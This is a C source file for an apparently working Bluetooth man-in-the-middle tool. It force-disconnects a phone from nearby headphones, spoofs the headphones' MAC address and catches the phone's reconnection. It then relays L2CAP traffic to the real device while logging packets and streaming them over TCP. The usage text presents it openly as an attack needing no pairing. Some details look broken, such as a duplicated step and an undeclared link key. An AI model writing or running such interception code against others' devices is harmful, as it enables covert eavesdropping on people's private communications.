#include "config.h"
#include "bt_utils.h"
#include "tcp_server.h"
#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>

static volatile int running = 1;

void signal_handler(int sig) {
    INFO_PRINT("Received signal %d, shutting down...", sig);
    running = 0;
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Bluetooth MITM Interceptor - Pure Man-in-the-Middle Attack\n\n");
    fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  -t <target_mac>    Target device MAC (headphones/BT device)\n");
    fprintf(stderr, "  -p <psm>           L2CAP PSM (default: 25 for A2DP audio)\n");
    fprintf(stderr, "  -P <port>          TCP server port (default: %d)\n", TCP_SERVER_PORT);
    fprintf(stderr, "  -S                 Interactive mode - scan and select devices\n");
    fprintf(stderr, "  -h                 Show this help\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Pure MITM Attack Flow:\n");
    fprintf(stderr, "  1. Scan for active Bluetooth connections in the area\n");
    fprintf(stderr, "  2. Force disconnect phone from target device\n");
    fprintf(stderr, "  3. Spoof target device MAC address\n");
    fprintf(stderr, "  4. Accept connection from phone (pretending to be target)\n");
    fprintf(stderr, "  5. Connect to real target device (pretending to be phone)\n");
    fprintf(stderr, "  6. Log all packets flowing between them\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Example:\n");
    fprintf(stderr, "  %s -S                      # Interactive mode (recommended)\n", prog_name);
    fprintf(stderr, "  %s -t AA:BB:CC:DD:EE:FF    # Direct target MAC\n", prog_name);
    fprintf(stderr, "\n");
    fprintf(stderr, "Note: This is a pure MITM attack. NO pairing with target required!\n");
    fprintf(stderr, "      The MITM computer acts as a transparent relay.\n");
}

void display_devices(bt_device_t *devices, int count) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("  #  │  MAC Address       │  Status      │  Device Name\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    for (int i = 0; i < count; i++) {
        const char *status = devices[i].connected ? "CONNECTED  " : "Paired     ";
        printf(" %2d  │  %s  │  %s │  %s\n", 
               i + 1, devices[i].addr, status, devices[i].name);
    }
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("These devices are paired with this computer.\n");
    printf("CONNECTED devices will be disconnected during MITM setup.\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("\n");
}

char* select_device(bt_device_t *devices, int count, const char *prompt) {
    int choice;
    while (1) {
        printf("%s (1-%d): ", prompt, count);
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            printf("Invalid input. Please enter a number.\n");
            continue;
        }
        while (getchar() != '\n');
        
        if (choice >= 1 && choice <= count) {
            return devices[choice - 1].addr;
        }
        
        printf("Invalid choice. Please select a number between 1 and %d.\n", count);
    }
}

int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client) {
    uint8_t buffer[MAX_BUFFER_SIZE];
    fd_set read_fds;
    int max_fd;
    struct timeval timeout;
    
    INFO_PRINT("Entering relay loop...");
    
    while (running) {
        FD_ZERO(&read_fds);
        
        FD_SET(phone_sock, &read_fds);
        max_fd = phone_sock;
        
        FD_SET(headset_sock, &read_fds);
        if (headset_sock > max_fd) max_fd = headset_sock;
        
        if (tcp_client < 0) {
            FD_SET(tcp_server, &read_fds);
            if (tcp_server > max_fd) max_fd = tcp_server;
        }
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int ret = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            ERROR_PRINT("select() failed");
            return -1;
        }
        
        if (ret == 0) continue;
        
        if (tcp_client < 0 && FD_ISSET(tcp_server, &read_fds)) {
            tcp_client = tcp_accept_client(tcp_server);
            if (tcp_client >= 0) {
                INFO_PRINT("Streaming client connected");
            }
            continue;
        }
        
        if (FD_ISSET(phone_sock, &read_fds)) {
            ssize_t bytes = recv(phone_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Phone disconnected");
                } else {
                    ERROR_PRINT("Error reading from phone");
                }
                return -1;
            }
            
            INFO_PRINT("📱 PHONE → TARGET: %zd bytes", bytes);
            
            // Log first 64 bytes of data
            printf("[PACKET] ");
            for (int i = 0; i < (bytes < 64 ? bytes : 64); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 64) printf("... (%zd more bytes)", bytes - 64);
            printf("\n\n");
            
            // Forward to TCP client if connected
            if (tcp_client >= 0) {
                if (tcp_send_data(tcp_client, buffer, bytes) < 0) {
                    INFO_PRINT("TCP client disconnected");
                    close(tcp_client);
                    tcp_client = -1;
                }
            }
            
            // Forward directly to headset (no decryption/re-encryption)
            ssize_t sent = send(headset_sock, buffer, bytes, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to target device");
                return -1;
            }
        }
        
        if (FD_ISSET(headset_sock, &read_fds)) {
            ssize_t bytes = recv(headset_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Target device disconnected");
                } else {
                    ERROR_PRINT("Error reading from target device");
                }
                return -1;
            }
            
            INFO_PRINT("🎧 TARGET → PHONE: %zd bytes", bytes);
            
            // Log first 64 bytes of data
            printf("[PACKET] ");
            for (int i = 0; i < (bytes < 64 ? bytes : 64); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 64) printf("... (%zd more bytes)", bytes - 64);
            printf("\n\n");
            
            // Forward back to phone
            ssize_t sent = send(phone_sock, buffer, bytes, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to phone");
                return -1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char *target_mac = NULL;
    uint16_t psm = 25;
    uint16_t tcp_port = TCP_SERVER_PORT;
    int scan_mode = 0;
    
    int opt;
    while ((opt = getopt(argc, argv, "t:p:P:Sh")) != -1) {
        switch (opt) {
            case 't':
                target_mac = optarg;
                break;
            case 'p':
                psm = atoi(optarg);
                break;
            case 'P':
                tcp_port = atoi(optarg);
                break;
            case 'S':
                scan_mode = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Interactive device selection if MAC addresses not provided
    if (!target_mac || scan_mode) {
        bt_device_t devices[50];
        int device_count;
        char target_selected[18] = {0};
        
        INFO_PRINT("═══════════════════════════════════════════════════════");
        INFO_PRINT("   Bluetooth MITM Interceptor - Discovery Mode");
        INFO_PRINT("═══════════════════════════════════════════════════════");
        INFO_PRINT("");
        INFO_PRINT("This tool will:");
        INFO_PRINT("  1. Scan for active Bluetooth connections");
        INFO_PRINT("  2. Force disconnect the target device");
        INFO_PRINT("  3. Spoof target's MAC and intercept reconnection");
        INFO_PRINT("  4. Act as MITM and log all packets");
        INFO_PRINT("");
        INFO_PRINT("═══════════════════════════════════════════════════════");
        printf("\n");
        
        INFO_PRINT("Scanning for Bluetooth devices and active connections...");
        printf("\n");
        
        device_count = bt_scan_active_connections(devices, 50);
        if (device_count <= 0) {
            ERROR_PRINT("No Bluetooth devices found in the area");
            INFO_PRINT("");
            INFO_PRINT("Make sure:");
            INFO_PRINT("  - Target devices (phone + headphones) are nearby");
            INFO_PRINT("  - They are currently connected to each other");
            INFO_PRINT("  - Bluetooth adapter is powered on");
            return 1;
        }
        
        display_devices(devices, device_count);
        
        if (!target_mac) {
            INFO_PRINT("Select the TARGET device to intercept (usually headphones):");
            INFO_PRINT("This is the device the phone is connected to.");
            printf("\n");
            
            char *selected = select_device(devices, device_count, "Select target device");
            if (selected == NULL) {
                ERROR_PRINT("No device selected");
                return 1;
            }
            strncpy(target_selected, selected, sizeof(target_selected) - 1);
            target_mac = target_selected;
        }
        
        INFO_PRINT("✓ Target device selected: %s", target_mac);
        printf("\n");
    }
    
    if (!target_mac) {
        ERROR_PRINT("Target MAC address is required");
        print_usage(argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   Bluetooth MITM Attack - Active Mode");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("Target device:  %s", target_mac);
    INFO_PRINT("L2CAP PSM:      %d", psm);
    INFO_PRINT("TCP Port:       %d", tcp_port);
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    char adapter_mac[18];
    if (bt_get_adapter_address(adapter_mac, sizeof(adapter_mac)) < 0) {
        return 1;
    }
    INFO_PRINT("MITM adapter MAC: %s", adapter_mac);
    printf("\n");
    
    INFO_PRINT("MITM Attack Sequence Starting...");
    printf("\n");
    
    INFO_PRINT("Step 1: Force disconnect target device from current connection");
    int target_connected = bt_check_connection_status(target_mac);
    
    if (target_connected) {
        INFO_PRINT("⚠️  Target device is CONNECTED - forcing disconnect");
        
        // Try multiple disconnection methods
        if (bt_disconnect_device(target_mac) < 0) {
            WARN_PRINT("Standard disconnect failed, trying aggressive methods...");
            
            // Try hcitool disconnect
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "hcitool dc %s 2>&1", target_mac);
            system(cmd);
            sleep(1);
        }
        
        // Verify disconnection
        sleep(2);
        if (bt_check_connection_status(target_mac)) {
            ERROR_PRINT("Could not disconnect target device");
            INFO_PRINT("");
            INFO_PRINT("Please manually disconnect:");
            INFO_PRINT("  - Turn off target device, OR");
            INFO_PRINT("  - Disconnect from phone's Bluetooth settings");
            INFO_PRINT("");
            INFO_PRINT("Press Enter when disconnected...");
            getchar();
        } else {
            INFO_PRINT("✓ Target device disconnected");
        }
    } else {
        INFO_PRINT("✓ Target device is already disconnected");
    }
    printf("\n");
    
    INFO_PRINT("Step 2: Spoof target device MAC address");
    INFO_PRINT("Changing MITM adapter MAC to: %s", target_mac);
    
    if (bt_spoof_mac_address(0, target_mac) < 0) {
        ERROR_PRINT("MAC spoofing failed");
        INFO_PRINT("");
        INFO_PRINT("Manual MAC spoofing required:");
        INFO_PRINT("  sudo hciconfig hci0 down");
        INFO_PRINT("  sudo bdaddr -i hci0 %s", target_mac);
        INFO_PRINT("  sudo hciconfig hci0 up");
        INFO_PRINT("");
        INFO_PRINT("Press Enter when MAC is spoofed...");
        getchar();
    } else {
        INFO_PRINT("✓ MAC address spoofed successfully");
        sleep(2);
    }
    printf("\n");
    
    INFO_PRINT("Step 3: Make MITM adapter discoverable as target device");
    system("hciconfig hci0 piscan 2>&1");
    system("bluetoothctl discoverable on 2>&1 > /dev/null &");
    INFO_PRINT("✓ MITM adapter is now discoverable as %s", target_mac);
    printf("\n");
    
    INFO_PRINT("Step 4: Create TCP server for data streaming");
    
    if (crypto_init_link_key(link_key) < 0) {
        return 1;
    }
    INFO_PRINT("✓ Crypto initialized");
    printf("\n");
    
    INFO_PRINT("Step 4: Creating TCP server for data streaming");
    int tcp_server = tcp_create_server(tcp_port);
    if (tcp_server < 0) {
        return 1;
    }
    int tcp_client = -1;
    INFO_PRINT("✓ TCP server listening on port %d", tcp_port);
    printf("\n");
    
    INFO_PRINT("Step 5: Setup Bluetooth relay - Wait for phone to connect");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   MITM READY - Waiting for connections");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("");
    INFO_PRINT("The MITM is now pretending to be: %s", target_mac);
    INFO_PRINT("");
    INFO_PRINT("Next steps:");
    INFO_PRINT("  1. Phone will try to reconnect automatically, OR");
    INFO_PRINT("  2. Manually reconnect from phone's Bluetooth settings");
    INFO_PRINT("  3. Phone connects to MITM (thinks it's the headphones)");
    INFO_PRINT("  4. MITM will then connect to real headphones");
    INFO_PRINT("  5. All packets will be logged below");
    INFO_PRINT("");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    // Create L2CAP socket to accept connection from phone
    int phone_sock = bt_create_l2cap_socket();
    if (phone_sock < 0) {
        close(tcp_server);
        return 1;
    }
    
    // Bind as the spoofed target device (headphones)
    INFO_PRINT("Binding to L2CAP PSM %d as spoofed device...", psm);
    if (bt_bind_l2cap(phone_sock, NULL, psm) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_listen_l2cap(phone_sock, 1) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("✓ Listening for incoming connection from phone...");
    INFO_PRINT("Waiting for phone to connect (timeout: 60 seconds)...");
    printf("\n");
    
    // Set timeout for accept
    struct timeval tv;
    tv.tv_sec = 60;
    tv.tv_usec = 0;
    setsockopt(phone_sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    
    char phone_addr[18];
    int phone_conn = bt_accept_l2cap(phone_sock, phone_addr, sizeof(phone_addr));
    if (phone_conn < 0) {
        ERROR_PRINT("Phone did not connect within timeout");
        INFO_PRINT("Make sure phone is trying to connect to the headphones");
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("✓✓✓ PHONE CONNECTED ✓✓✓");
    INFO_PRINT("Source device (phone): %s", phone_addr);
    printf("\n");
    
    INFO_PRINT("Step 6: Connect to real target device (headphones)");
    INFO_PRINT("Restoring original adapter MAC: %s", adapter_mac);
    
    // Restore original MAC to connect to real headphones
    bt_spoof_mac_address(0, adapter_mac);
    sleep(1);
    
    INFO_PRINT("Connecting to real target device: %s", target_mac);
    int headset_sock = bt_create_l2cap_socket();
    if (headset_sock < 0) {
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_connect_l2cap(headset_sock, target_mac, psm) < 0) {
        ERROR_PRINT("Failed to connect to real target device");
        ERROR_PRINT("Make sure target device is powered on and in range");
        close(headset_sock);
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("✓✓✓ CONNECTED TO REAL DEVICE ✓✓✓");
    INFO_PRINT("");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   MITM ACTIVE - Logging all packets");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("Phone (%s) → MITM → Target (%s)", phone_addr, target_mac);
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    relay_loop(phone_conn, headset_sock, tcp_server, tcp_client);
    
    INFO_PRINT("Cleaning up...");
    if (tcp_client >= 0) close(tcp_client);
    close(tcp_server);
    close(headset_sock);
    close(phone_conn);
    close(phone_sock);
    
    INFO_PRINT("Shutdown complete");
    return 0;
}
